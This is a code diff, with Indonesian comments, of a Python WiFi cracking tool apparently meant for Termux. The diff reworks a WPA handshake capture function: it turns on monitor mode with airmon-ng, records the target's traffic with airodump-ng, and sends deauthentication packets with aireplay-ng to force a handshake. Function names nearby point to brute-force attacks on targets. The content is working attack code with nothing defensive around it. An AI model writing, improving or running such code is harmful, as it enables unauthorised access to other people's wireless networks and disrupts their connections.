@@ -1590,55 +1590,97 @@ def brute_force_attack(target):
         print(f"❌ Brute force attack failed: {e}")
 
 def capture_handshake(target):
-    """Capture WPA handshake untuk attack"""
-    print("🔄 Capturing WPA handshake...")
+    """Capture WPA handshake dengan metode yang compatible dengan Termux"""
+    print("🔄 Attempting to capture WPA handshake...")
+    
+    # Cek dulu jika device support monitor mode
+    if not check_monitor_mode_support():
+        print("❌ Device doesn't support monitor mode")
+        print("💡 Try alternative attack methods")
+        return False
     
     try:
-        # Deauthenticate clients untuk trigger handshake
-        print("   Sending deauth packets...")
-        deauth_proc = subprocess.Popen([
-            "aireplay-ng", 
-            "--deauth", "5",  # Kurangi jumlah deauth
-            "-a", target['bssid'],
-            "wlan0"
-        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        # Setup monitor mode
+        print("   Setting up monitor mode...")
+        setup_result = subprocess.run([
+            "airmon-ng", "start", "wlan0"
+        ], capture_output=True, text=True, timeout=30)
         
-        # Capture handshake
-        print("   Capturing handshake (10 seconds)...")
+        if setup_result.returncode != 0:
+            print("❌ Failed to setup monitor mode")
+            return False
+        
+        print("   Monitor mode activated")
+        
+        # Start handshake capture
+        print("   Starting handshake capture (15 seconds)...")
         capture_proc = subprocess.Popen([
             "airodump-ng",
             "--bssid", target['bssid'],
             "--channel", target['channel'],
             "--write", f"{CRACK_LOG_DIR}/handshake",
-            "wlan0"
+            "wlan0mon"
         ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
-        time.sleep(10)
+        # Deauth untuk trigger handshake
+        print("   Sending deauth packets...")
+        deauth_proc = subprocess.Popen([
+            "aireplay-ng",
+            "--deauth", "3",
+            "-a", target['bssid'],
+            "wlan0mon"
+        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        time.sleep(15)
+        
+        # Stop processes
         capture_proc.terminate()
         deauth_proc.terminate()
         
-        # Cek jika handshake berhasil di-capture
+        # Kembalikan ke managed mode
+        subprocess.run(["airmon-ng", "stop", "wlan0mon"], capture_output=True)
+        
+        # Cek handshake file
         handshake_file = f"{CRACK_LOG_DIR}/handshake-01.cap"
         if os.path.exists(handshake_file):
-            # Verifikasi handshake
-            result = subprocess.run([
-                "aircrack-ng",
-                handshake_file,
-                "-w", "/dev/null"  # Test dengan wordlist kosong
-            ], capture_output=True, text=True, timeout=30)
-            
-            if "1 handshake" in result.stdout:
-                print("✅ WPA handshake captured and verified!")
+            file_size = os.path.getsize(handshake_file)
+            if file_size > 1000:  # File harus cukup besar
+                print(f"✅ Handshake captured! File size: {file_size} bytes")
                 return True
             else:
-                print("❌ No valid handshake captured")
+                print("❌ Handshake file too small")
                 return False
         else:
-            print("❌ Handshake file not created")
+            print("❌ Handshake file not found")
             return False
             
     except Exception as e:
-        print(f"❌ Handshake capture failed: {e}")
+        print(f"❌ Handshake capture error: {e}")
+        # Cleanup
+        subprocess.run(["airmon-ng", "stop", "wlan0mon"], capture_output=True)
+        return False
+
+def check_monitor_mode_support():
+    """Cek jika device support monitor mode"""
+    try:
+        # Cek jika interface wlan0 ada
+        result = subprocess.run(["ip", "link", "show", "wlan0"], 
+                              capture_output=True, text=True)
+        if result.returncode != 0:
+            print("   ❌ wlan0 interface not found")
+            return False
+        
+        # Cek jika airmon-ng work
+        result = subprocess.run(["airmon-ng"], capture_output=True, text=True)
+        if result.returncode != 0:
+            print("   ❌ airmon-ng not working properly")
+            return False
+            
+        print("   ✅ Monitor mode supported")
+        return True
+        
+    except Exception as e:
+        print(f"   ❌ Monitor mode check failed: {e}")
         return False
 
 def smart_brute_force_attack(target):
